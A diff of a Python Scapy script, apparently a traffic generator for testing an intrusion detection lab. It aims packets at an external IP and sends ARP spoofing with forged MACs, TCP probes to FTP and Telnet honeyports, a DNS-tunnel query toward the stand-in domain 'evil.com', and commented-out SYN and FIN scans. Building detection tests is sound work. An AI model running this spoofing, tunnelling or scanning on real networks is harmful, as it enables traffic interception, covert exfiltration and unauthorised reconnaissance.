@@ -9,59 +9,32 @@ import warnings
 # Suppress the iface warning — we're sending to loopback so iface has no effect
 warnings.filterwarnings("ignore", message=".*iface.*has no effect.*")
 
-DST_IP  = "127.0.0.1"
+DST_IP  = "129.21.102.104"
 SRC_IP  = "192.168.1.2"
 SRC_MAC = "56:1A:7D:3F:4B:6C"
 DST_MAC = "41:1A:7D:3F:4B:6C"
 
+IFACE = "Wi-Fi"
+
 def send_packet(protocol, dst_ip, src_ip=None, src_port=None, dst_port=None,
-                src_mac=None, dst_mac=None, flags=None, payload=None,
-                num_packets=1, iface=None):
+                flags=None, payload=None, num_packets=1):
+    eth = Ether(src=SRC_MAC, dst=DST_MAC)
+    ip  = IP(src=src_ip or SRC_IP, dst=dst_ip)
 
-    protocol = protocol.upper()
-
-    if protocol == "DNS":
-        safe_payload = payload.decode("utf-8").replace(" ", "-") if payload else ""
-        ip  = IP(dst=dst_ip, src=src_ip) if src_ip else IP(dst=dst_ip)
-        pkt = ip \
-            / UDP(sport=src_port or 12345, dport=dst_port or 53) \
-            / DNS(rd=1, qd=DNSQR(qname=safe_payload))
-        send(pkt, count=num_packets, verbose=True)
-
-    elif protocol == "TCP":
-        ip  = IP(dst=dst_ip, src=src_ip) if src_ip else IP(dst=dst_ip)
-        tcp = TCP(
-            sport=src_port or 1024,
-            dport=dst_port or 80,
-            flags=flags or "",
-        )
-        pkt = ip / tcp
+    if protocol == "TCP":
+        l4 = TCP(sport=src_port or 1024, dport=dst_port or 80, flags=flags or "S")
+        pkt = eth/ip/l4
         if payload:
-            pkt = pkt / (payload if isinstance(payload, bytes) else payload.encode())
-        send([pkt] * num_packets, verbose=False)
-
+            pkt = pkt/(payload.encode() if isinstance(payload, str) else payload)
     elif protocol == "UDP":
-        ip  = IP(dst=dst_ip, src=src_ip) if src_ip else IP(dst=dst_ip)
-        udp = UDP(sport=src_port or 1024, dport=dst_port or 53)
-        pkt = ip / udp / payload if payload else ip / udp
-        send([pkt] * num_packets, verbose=False)
-
+        pkt = eth/ip/UDP(sport=src_port or 1024, dport=dst_port or 53)
+        if payload: pkt = pkt/payload
+    elif protocol == "DNS":
+        pkt = eth/ip/UDP(sport=src_port or 12345, dport=53)/DNS(rd=1, qd=DNSQR(qname=payload))
     elif protocol == "ICMP":
-        ip  = IP(dst=dst_ip, src=src_ip) if src_ip else IP(dst=dst_ip)
-        send([ip / ICMP()] * num_packets, verbose=False)
-
-    elif protocol == "ARP":
-        if not dst_ip:
-            raise ValueError("ARP requires dst_ip")
-        arp = ARP(pdst=dst_ip)
-        if src_ip:  arp.psrc  = src_ip
-        if src_mac: arp.hwsrc = src_mac
-        eth = Ether(dst=dst_mac or "ff:ff:ff:ff:ff:ff",
-                    src=src_mac or SRC_MAC)
-        sendp([eth / arp] * num_packets, verbose=False)
-
-    else:
-        raise ValueError(f"Unsupported protocol: {protocol}")
+        pkt = eth/ip/ICMP()
+    
+    sendp([pkt]*num_packets, iface=IFACE, verbose=False)
 
 
 def make_tunnel_domain(base_domain="evil.com"):
@@ -117,8 +90,24 @@ def send_arp(target_ip, spoof_ip, spoof_mac, num_packets=1):
     sendp([eth / arp] * num_packets, iface="Wi-Fi", verbose=True)
 
 def main():
-    #send_ftp(20)
-    #send_arp("129.21.102.104", "192.168.1.3", "ad:bb:cc:dd:ee:ff", 20)
-    send_dns(20)
+    ports = []
+    for num in range(30):
+        ports.append(num)
+    
+    # ARP Spoof
+    send_arp(DST_IP, SRC_IP, "aa:bb:cc:dd:ee:ff", 1) # Initialize ARP
+    send_arp(DST_IP, SRC_IP, "bb:bb:cc:dd:ee:ff", 1) # Change ARP
+    
+    # Honeyport
+    send_packet("TCP", DST_IP, SRC_IP, 9999, 21, None, None, 1)  # FTP honeyport
+    send_packet("TCP", DST_IP, SRC_IP, 9999, 23, None, None, 1)  # Telnet honeyport (port 23!)
+    
+    # DNS Tunnel
+    send_dns(1) # DNS Tunnel
+    
+    # SYN Scan
+    #send_port_scan(ports, "S") # SYN scan
+    #send_port_scan(ports, "F") # FIN scan
+    #send_port_scan(ports, "FPU") # FIN scan
 
 main()
